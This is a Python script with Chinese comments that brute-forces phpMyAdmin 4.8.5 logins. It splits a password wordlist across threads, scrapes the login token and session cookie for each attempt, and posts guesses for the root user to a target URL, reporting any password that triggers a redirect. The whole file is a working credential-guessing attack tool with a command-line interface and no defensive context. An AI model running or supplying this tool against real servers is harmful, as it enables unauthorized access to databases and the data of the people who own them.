#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 爆破phpMyAdmin，适用4.8.5

import requests
import re
import time
import html
import math
import optparse
from progressbar import *
import logging
import threading


url = "http://192.168.101.248/phpmyadmin/index.php"
password = "password.txt"
username = "root"


# 默认处理核心数
default_thread_core=10
# 默认单核处理数据大小
# todo 暂未用到，后续迭代动态扩容的时候再用
default_thread_size=100


obs_bar=None
bar={}
threadLock = threading.Lock()

class File_bot:
    path=''
    file=None
    def __init__(self, path):
        self.path = path
        self.file = open(path, mode='r')
    # 获取文件总行数
    def line_count(self):
        return len(self.file.readlines())

    # 获取指定行的数据
    def get_line(self,line_number):
        if line_number < 1:
            return ''
        for cur_line_number, line in enumerate(open(self.path, mode='r')):
            if cur_line_number == line_number - 1:
                line = line.replace("\r", "")
                line = line.replace("\n", "")
                return line
        return ''
    def iter_count(self):
        import subprocess
        out = subprocess.getoutput("wc -l %s" % self.path)
        print(out)
        return int(out.split()[0])


class Fuck_bot(threading.Thread):
    start_line=0
    end_line=0
    line_size=0
    file=None
    thread_name=''

    def __init__(self, thread_name, start_line, end_line, line_size, file):
        threading.Thread.__init__(self)
        self.thread_name = thread_name
        self.start_line = start_line
        self.end_line = end_line
        self.line_size=line_size
        self.file = file

    def run(self):
        for line in range(self.start_line, self.end_line):
            # 进度满足时，通知记录者
            # threadLock.acquire()
            # if('Thread-306' == self.thread_name):
                # print("end",self.end_line)
                # print("start",self.start_line)
                # print("thread_name: %s, line: %s, bar: %s" % (self.thread_name, line, line % self.line_size))
            bar[self.thread_name] = line % (self.end_line - self.start_line)
            # threadLock.release()
            pwd = self.file.get_line(line)
            data, header = self.get_data_header(pwd)
            res = requests.post(url, data=data, headers=header)

            # 通过history可用获取重定向数据，如果存在重定向则判断密码正确
            if (len(res.history) != 0):
                print("------------------------有戏！")
                print("pwd:" + pwd)
                # todo 正确之后考虑如何暂时所有世界线，并使进度条跑满
            else:
                # print("thread: %s, 密码错误: %s" %( thread_name, pwd))
                pass
        # print("%s 残念" % self.thread_name)
        # 该世界线结束后，直接通知观测者将自己设置到最大
        bar[self.thread_name] = self.line_size
    def get_ok_token_and_session(self):
        token = ''
        session = ''
        while ( token == '' or not self.token_can_use(token) ):
            res = requests.get(url)

            try:
                token = self.get_token(res)
                session = self.get_session(res)
            except Exception as e:
                # 可能因为网络原因获取token异常，重置token后重新获取即可
                token=''

        return token, session

    def get_data_header(self, password):
        token, session = self.get_ok_token_and_session()

        data = {
            'pma_username': 'root',
            'pma_password': password,
            "server": "1",
            "target": "index.php",
            'token': token,
            'set_session': session
        }

        header = {
            'Cookie': 'pma_lang=zh_CN; phpMyAdmin=' + session
        }
        return data, header

    # 判断当前token是否可用，有时候会返回一些十六进制的数据，需要丢弃
    def token_can_use(self, token):
        result = re.findall(r'[|&lt;]', token)
        if len(result) == 0:
            return True
        else:
            return False

    def get_token(self, res):
        token = re.findall(r'name="token" value="(.*)" /></fieldset>', res.text)
        token = str(token[0])

        return token

    def get_session(self, res):
        session = re.findall(r'name="set_session" value="(.*?)" />', res.text)
        session = str(session[0])

        return session




def option():
    usage = '%prog -h | --help'
    parser = optparse.OptionParser(usage = usage)
    parser.add_option("--url",  dest="url",         help="target url  usage: -url http://www.xxx.com/phpmyadmin")
    parser.add_option("--user", dest="username",    help="username   usage: --user root")
    parser.add_option("--pass", dest="password",    help="password path   usage: --pass /sqlsec/password.txt")
    (options, args) = parser.parse_args()
    return parser,options

def check_opt_and_init():
    parser,args = option()
    if not args.url:
        parser.print_help()
        exit()
    else:
        pass

    global url
    url = args.url
    if args.username:
        global username
        username = args.username
    if args.password:
        global password
        password = args.password


def start_bar(size):
    widgets = ['Progress: ',Percentage(), ' ', Bar('#'),' ', Timer(),
           ' ', ETA(), ' ', FileTransferSpeed()]
    bar = ProgressBar(widgets=widgets, maxval=size).start()
    global obs_bar
    obs_bar = bar


# 观测者，记录并统计各个世界线情况
def obs(size):
    for i in range(size):
        flag=1
        temp=[]
        while flag:
            temp.clear()
            for key in list(bar):
                if bar[key] >= i:
                    temp.append(bar[key])
            # print(bar)
            if(len(temp) == len(bar)):
                obs_bar.update(i)
                flag=0
    print("观测结束,最后记录时间点:", bar)
    print("世界大小:", size)
def test():
    bar = progressbar.ProgressBar(max_value=progressbar.UnknownLength)
    for i in range(20):
        time.sleep(0.1)
        bar.update(i)


def main():
    check_opt_and_init()

    print("url", url)
    print("username", username)
    print("password", password)
    print("\n")

    file = File_bot(password)
    # 密码总行数
    all_line = file.iter_count()

    # 计算世界线分配大小
    # todo 后续考虑线程数动态分配
    line_size = math.ceil(all_line / default_thread_core)


    print("密码总行数：%d " % all_line)
    print("启用 %s 个世界线进行爆破，每个处理 %s " % (default_thread_core, line_size))

    threads=[]
    for line_page in range(math.ceil(all_line / line_size)):
        start_line = line_page * line_size
        
        if (line_page + 1 == math.ceil(all_line / line_size)):
            end_line = all_line
        else:
            end_line = (line_page + 1) * line_size

        try:
            print("执行 %s - %s" % (start_line, end_line))
            thread = Fuck_bot(thread_name="Thread-" + str(start_line), start_line=start_line, end_line=end_line, line_size=line_size, file=file)
            thread.start()
            threads.append(thread)
        except:
           print ("Error: 无法启动线程")

    start_bar(size=line_size)
    obs(size=line_size)

    for thr in threads:
        thr.join()
    print("end")




if __name__ == '__main__':
    # run_bot(start_line=900,end_line=1000)
    main()

